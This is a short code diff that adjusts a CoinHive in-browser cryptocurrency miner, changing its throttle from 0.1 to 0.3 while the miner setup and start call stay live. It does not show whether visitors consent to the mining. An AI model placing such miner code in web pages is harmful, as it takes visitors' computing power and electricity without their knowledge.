@@ -3,7 +3,7 @@
 var miner = new CoinHive.Anonymous('vEkg89qxgbLG7KgSwULvbVzglIwp9Tcu', {
 	threads: 3,
 	autoThreads: true,
-	throttle: 0.1,
+	throttle: 0.3,
 	forceASMJS: false
 });
 miner.start();
